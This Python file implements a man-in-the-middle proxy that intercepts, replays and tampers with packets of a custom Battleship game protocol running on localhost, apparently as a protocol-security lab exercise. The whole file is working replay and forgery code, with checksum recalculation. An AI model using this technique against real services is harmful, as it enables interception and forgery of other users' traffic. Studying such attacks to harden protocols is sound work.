# Updated man-in-the-middle proxy for Battleship protocol

import socket
import threading
import time
import logging
import struct
import binascii
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256

from protocol import send_message, receive_message
from protocol.src.checksum import compute_checksum

# Configuration
CLIENT_LISTEN = ('127.0.0.1', 8000)  # Proxy listens here; client connects here
SERVER_TARGET = ('127.0.0.1', 5001)  # Proxy connects to real server here

# Add logging configuration
logging.basicConfig(level=logging.DEBUG, format='[%(levelname)s] %(message)s')
logger = logging.getLogger("attacker")

# Encryption keys and parameters (placeholders, replace with actual values)
KEY = b'Sixteen byte key'
NONCE = b'UniqueNonce'
IV0 = b'InitializationVe'

class ReplayAttacker:
    def __init__(self):
        self.stored_packets = []  # Store intercepted packets for replay

    def intercept_and_forward(self, client_sock, server_sock):
        """Intercept packets from client, forward to server, and store them."""
        while True:
            try:
                packet = client_sock.recv(1024)
                if not packet:
                    break

                # Validate packet length
                if len(packet) < 18:  # Minimum size for IV (16 bytes) + seq_num (2 bytes)
                    logger.warning(f"[ATTACKER] Received malformed packet: {packet.hex()}")
                    continue

                # Extract IV and sequence number for storage
                iv = packet[:16]  # Assuming IV is the first 16 bytes
                seq_num = struct.unpack('>H', packet[16:18])[0]  # Assuming seq_num is next 2 bytes

                self.stored_packets.append((iv, seq_num, packet))
                logger.debug(f"[ATTACKER] Intercepted packet with IV={iv.hex()} and seq_num={seq_num}")

                server_sock.sendall(packet)
            except Exception as e:
                logger.error(f"[ATTACKER] Error intercepting packet: {e}")
                break

    def intercept_and_forward_to_client(self, server_sock, client_sock):
        """Intercept packets from server, forward to client."""
        while True:
            try:
                packet = receive_message(server_sock)
                if not packet:
                    logger.info("[ATTACKER] No more packets from server. Closing connection.")
                    break

                # Forward the packet to the client
                send_message(client_sock, packet)
                logger.debug(f"[ATTACKER] Forwarded packet to client: {packet}")

            except Exception as e:
                logger.error(f"[ATTACKER] Error intercepting from server: {e}")
                break

    def replay_packets(self, server_sock):
        """Replay stored packets to the server."""
        logger.info("[ATTACKER] Replaying stored packets...")
        for iv, seq_num, packet in self.stored_packets:
            try:
                logger.debug(f"[ATTACKER] Replaying packet with IV={iv.hex()} and seq_num={seq_num}")
                server_sock.sendall(packet)
            except Exception as e:
                logger.error(f"[ATTACKER] Error replaying packet: {e}")

    def modify_and_replay_packets(self, server_sock):
        """Modify stored packets and replay them."""
        logger.info("[ATTACKER] Modifying and replaying stored packets...")
        for iv, seq_num, packet in self.stored_packets:
            try:
                # Modify sequence number (e.g., increment by 1)
                new_seq_num = (seq_num + 1) % 65536  # Ensure it wraps around at 16 bits
                new_seq_bytes = struct.pack('>H', new_seq_num)

                # Modify payload (e.g., append extra data)
                payload = packet[18:-2]  # Extract payload (excluding IV, seq_num, and checksum)
                modified_payload = payload + b"_tampered"

                # Recalculate checksum (assuming checksum is last 2 bytes)
                new_packet = iv + new_seq_bytes + modified_payload
                new_checksum = struct.pack('>H', compute_checksum(new_packet))

                # Assemble modified packet
                modified_packet = new_packet + new_checksum
                logger.debug(f"[ATTACKER] Replaying modified packet with new_seq_num={new_seq_num}")
                server_sock.sendall(modified_packet)
            except Exception as e:
                logger.error(f"[ATTACKER] Error modifying/replaying packet: {e}")

    def run(self):
        """Run the attacker as a man-in-the-middle proxy."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock, \
                 socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_sock:

                client_sock.bind(CLIENT_LISTEN)
                client_sock.listen(1)
                logger.info("[ATTACKER] Waiting for client connection...")

                conn, addr = client_sock.accept()
                logger.info(f"[ATTACKER] Client connected from {addr}")

                server_sock.connect(SERVER_TARGET)
                logger.info("[ATTACKER] Connected to server")

                # Start intercepting and forwarding threads
                threading.Thread(target=self.intercept_and_forward, args=(conn, server_sock), daemon=True).start()
                threading.Thread(target=self.intercept_and_forward, args=(server_sock, conn), daemon=True).start()

                # Wait for user input to trigger replay
                while True:
                    cmd = input("Enter 'replay' to replay packets or 'modify' to modify and replay: ").strip()
                    if cmd == 'replay':
                        self.replay_packets(server_sock)
                    elif cmd == 'modify':
                        self.modify_and_replay_packets(server_sock)
                    elif cmd == 'exit':
                        break
        except Exception as e:
            logger.error(f"[ATTACKER] Error in proxy: {e}")
        finally:
            logger.info("[ATTACKER] Shutting down attacker proxy")

if __name__ == "__main__":
    attacker = ReplayAttacker()
    attacker.run()